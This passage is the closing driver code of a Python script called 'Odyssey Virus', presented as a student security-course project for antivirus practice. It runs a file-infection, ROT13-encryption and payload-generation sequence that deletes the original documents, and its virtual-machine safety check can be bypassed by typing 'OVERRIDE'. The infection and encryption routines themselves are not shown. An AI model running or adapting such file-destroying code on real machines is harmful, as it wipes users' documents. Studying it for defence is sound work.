                self.log_activity("Educational consent denied - execution terminated", "WARNING")
                print("❌ Educational consent required. Execution terminated.")
                return False
            
            if not SecurityValidator.detect_virtual_environment():
                self.log_activity("Virtual environment not detected", "WARNING")
                print("⚠️  WARNING: Virtual machine environment not detected!")
                print("⚠️  WARNING: Original files will be DELETED!")
                
                override_response = input("Type 'OVERRIDE' to continue: ").strip()
                if override_response != 'OVERRIDE':
                    self.log_activity("Safety override denied - execution terminated", "WARNING")
                    print("❌ Safety verification failed. Execution terminated.")
                    return False
            
            self.log_activity("Safety verification completed successfully")
            print("✅ Safety verification passed. Beginning simulation...")
            print("🗑️  NOTE: Original files will be permanently replaced with encrypted versions")
            print()
            
            # Display available document processing capabilities
            print("📄 Document Processing Capabilities:")
            print(f"   • Word Documents (.docx): {'✅' if DOCX_AVAILABLE else '❌'}")
            print(f"   • PDF Files (.pdf): {'✅' if PDF_AVAILABLE else '❌'}")
            print(f"   • Excel Files (.xlsx): {'✅' if XLSX_AVAILABLE else '❌'}")
            print(f"   • PowerPoint (.pptx): {'✅' if PPTX_AVAILABLE else '❌'}")
            print(f"   • Text Files: ✅")
            print()
            
            # Execute virus behaviors
            print("📁 Phase 1: Target Environment Setup")
            self.setup_target_environment()
            
            print("\n🦠 Phase 2: File Infection Process")
            infected_count = self.perform_file_infection()
            
            print("\n🔐 Phase 3: Multi-Format File Encryption & Replacement")
            self.perform_file_encryption()
            
            print("\n💬 Phase 4: Educational Messages")
            self.display_educational_messages()
            
            print("\n📦 Phase 5: Payload Generation")
            self.generate_payload()
            
            print("\n🔄 Phase 6: File Manipulation Simulation")
            self.simulate_file_manipulation()
            
            print("\n🎯 Phase 7: Infection Marker")
            self.create_infection_marker()
            self.create_infection_marker()
            
            # Execution summary
            execution_duration = datetime.now() - self.execution_start_time
            
            print(f"\n✅ ODYSSEY SIMULATION COMPLETED")
            print("═" * 60)
            print(f"📊 Execution Statistics:")
            print(f"   • Duration: {execution_duration.total_seconds():.2f} seconds")
            print(f"   • Files processed: {self.files_processed}")
            print(f"   • Files infected: {self.files_infected}")
            print(f"   • Files replaced: {self.files_replaced}")
            print(f"   • Encryption operations: {self.encryption_operations}")
            print(f"   • Infection operations: {self.infection_operations}")
            print(f"   • Document types: {len(self.document_types_processed)}")
            print(f"   • Target directory: {self.target_directory}")
            
            if self.document_types_processed:
                print(f"📄 Document Types Processed:")
                for doc_type, count in self.document_types_processed.items():
                    print(f"   • {doc_type}: {count} files")
            
            print(f"📋 Generated Files:")
            print(f"   • Activity log: {self.log_file}")
            print(f"   • Infection marker: {self.marker_file}")
            print(f"   • Encrypted payload: {self.payload_file}")
            print(f"   • Encryption manifest: {self.encryption_log_file}")
            print()
            print("🎓 Educational objectives achieved:")
            print("   ✓ File infection with virus signature injection")
            print("   ✓ Realistic multi-format document processing with file replacement")
            print("   ✓ ROT13 encryption across document types")
            print("   ✓ Advanced malware behavior simulation")
            print("   ✓ Original file deletion simulation")
            print("   ✓ Antivirus detection and recovery challenges")
            print("   ✓ Comprehensive logging and reporting")
            
            self.log_activity("Odyssey virus simulation completed successfully")
            return True
            
        except KeyboardInterrupt:
            self.log_activity("Simulation interrupted by user", "WARNING")
            print("\n⚠️  Simulation interrupted by user (Ctrl+C)")
            return False
            
        except Exception as e:
            self.log_activity(f"Simulation error: {str(e)}", "ERROR")
            print(f"\n❌ Simulation error: {str(e)}")
            return False

def main():
    """Main entry point for Odyssey Virus"""
    print("🎓 ODYSSEY VIRUS")
    print("National Teachers College - Information Assurance and Security 1 Finals Project")
    print("ROT13 Multi-Document Cryptographic Implementation with File Replacement")
    print("=" * 60)
    print()
    print("⚠️  EDUCATIONAL PURPOSE ONLY")
    print("⚠️  WARNING: ORIGINAL FILES WILL BE DELETED")
    print("Must be executed in virtual machine environment")
    print("For academic cybersecurity learning and research")
    print()
    print("📄 BEHAVIORAL CHANGES:")
    print("   • Original files are deleted after encryption")
    print("   • No automatic sample file creation")
    print("   • Files are permanently replaced with encrypted versions")
    print("   • More realistic malware behavior simulation")
    print()
    print("📄 Multi-Document Format Support:")
    print("   • Word Documents (.docx)")
    print("   • PDF Files (.pdf)")
    print("   • Excel Spreadsheets (.xlsx)")
    print("   • PowerPoint Presentations (.pptx)")
    print("   • Text Files (.txt, .md, .csv, .py, .js, .html, .css)")
    print()
    
    # Check for optional libraries
    missing_libs = []
    if not DOCX_AVAILABLE:
        missing_libs.append("python-docx (for Word document support)")
    if not PDF_AVAILABLE:
        missing_libs.append("PyPDF2 (for PDF support)")
    if not XLSX_AVAILABLE:
        missing_libs.append("openpyxl (for Excel support)")
    if not PPTX_AVAILABLE:
        missing_libs.append("python-pptx (for PowerPoint support)")
    
    if missing_libs:
        print("📦 Optional libraries not installed:")
        for lib in missing_libs:
            print(f"   • {lib}")
        print("\nInstall with: pip install python-docx PyPDF2 openpyxl python-pptx")
        print("(Virus will work with reduced functionality)\n")
    
    print("📁 SETUP INSTRUCTIONS:")
    print("   1. Create the 'odyssey_test_environment' directory")
    print("   2. Place your test files in that directory")
    print("   3. Run this virus to encrypt and replace those files")
    print("   4. Use your antivirus to detect and recover the files")
    print()
    
    try:
        odyssey = OdysseyVirus()
        success = odyssey.execute_educational_simulation()
        
        if success:
            print("\n🎯 Ready for antivirus development and testing!")
            print("Your antivirus will need to handle:")
            print("   • Multiple document formats")
            print("   • ROT13 decryption")
            print("   • File recovery (originals are deleted)")
            print("   • Encrypted file detection and processing")
        else:
            print("\n📚 Review safety requirements and try again in proper environment.")
            
    except Exception as e:
        print(f"\n❌ Fatal error: {str(e)}")
        print("Contact your instructor for assistance.")

if __name__ == "__main__":
    main()